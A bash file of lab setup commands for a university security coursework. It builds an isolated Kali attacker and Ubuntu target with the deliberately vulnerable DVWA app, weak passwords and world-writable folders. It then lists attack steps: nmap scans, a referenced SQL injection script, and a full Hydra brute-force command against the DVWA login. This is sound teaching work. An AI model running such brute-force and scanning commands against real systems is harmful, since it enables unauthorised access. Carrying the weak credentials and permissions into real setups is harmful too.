#!/bin/bash
# ============================================================
# ELEC0138 CW1 — Lab Setup Commands
# Environment: VirtualBox on macOS (Apple Silicon M2)
# Attacker: Kali Linux 2026.1 ARM64  (10.0.0.1)
# Target:   Ubuntu Server 24.04 ARM64 (10.0.0.2)
# Network:  VirtualBox Internal Network "corpnet"
# ============================================================


# ────────────────────────────────────────────────────────────
# SECTION 1 — KALI LINUX (Attacker Machine)
# Run these commands on the Kali VM
# ────────────────────────────────────────────────────────────

# 1.1 Assign static IP on the internal network adapter (rerun after every reboot)
sudo ip addr add 10.0.0.1/24 dev eth0

# 1.2 Get internet access via NAT adapter (rerun after every reboot)
sudo dhcpcd eth1

# 1.3 Verify connectivity to target
ping -c 3 10.0.0.2


# ────────────────────────────────────────────────────────────
# SECTION 2 — UBUNTU SERVER (Target Machine)
# Run these commands on the Ubuntu VM
# ────────────────────────────────────────────────────────────

# 2.1 Assign static IP on the internal network adapter (rerun after every reboot)
sudo ip addr add 10.0.0.2/24 dev eth0

# 2.2 Get internet access via NAT adapter
sudo dhclient eth1

# 2.3 Update package list
sudo apt update

# 2.4 Install LAMP stack
sudo apt install -y apache2 mariadb-server php php8.3-mysql php-gd git

# 2.5 Start and enable services
sudo systemctl start apache2
sudo systemctl enable apache2
sudo systemctl start mariadb
sudo systemctl enable mariadb

# 2.6 Secure MariaDB and set root password
sudo mysql_secure_installation
# When prompted: set root password to p@ssw0rd, answer Y to all remaining questions

# 2.7 Clone DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa

# 2.8 Configure DVWA database credentials
sudo cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
sudo nano /var/www/html/dvwa/config/config.inc.php
# Change: $_DVWA['db_password'] = 'p@ssw0rd';

# 2.9 Set DVWA folder permissions
sudo chmod -R 777 /var/www/html/dvwa/hackable/uploads/
sudo chmod -R 777 /var/www/html/dvwa/config/

# 2.10 Create DVWA database and user in MariaDB
sudo mysql -u root -p
# Run inside MySQL:
#   CREATE DATABASE dvwa;
#   CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
#   GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
#   FLUSH PRIVILEGES;
#   EXIT;

# 2.11 Restart Apache
sudo systemctl restart apache2

# 2.12 Initialise DVWA database
# Open browser on Kali: http://10.0.0.2/dvwa/setup.php
# Click "Create / Reset Database"
# Login: admin / password
# Set Security Level to Low: DVWA Security tab → Low → Submit


# ────────────────────────────────────────────────────────────
# SECTION 3 — ATTACK COMMANDS (run on Kali)
# ────────────────────────────────────────────────────────────

# 3.1 Nmap — port discovery
nmap 10.0.0.2

# 3.2 Nmap — service and version detection (save output)
nmap -sV -sC -p 80 10.0.0.2 -oN nmap_scan.txt

# 3.3 SQL Injection — Python script
python3 sql_injection_demo.py
# Results saved to: sql_injection_results.txt

# 3.4 Unzip RockYou wordlist (if not already done)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 3.5 Get a valid DVWA session cookie (required to access the brute force vulnerability page)
# Log into DVWA and retrieve the PHPSESSID from the browser:
# Open Firefox on Kali → http://10.0.0.2/dvwa/login.php → login as admin/password
# Open Inspector (F12) → Storage → Cookies → copy PHPSESSID value
# Set security level to Low: DVWA Security tab → Low → Submit

# 3.6 Hydra brute force against DVWA Brute Force vulnerability page (save output)
# Replace PHPSESSID value below with the one copied from your browser session
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 \
  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
# Result: 1 valid password found — admin:password
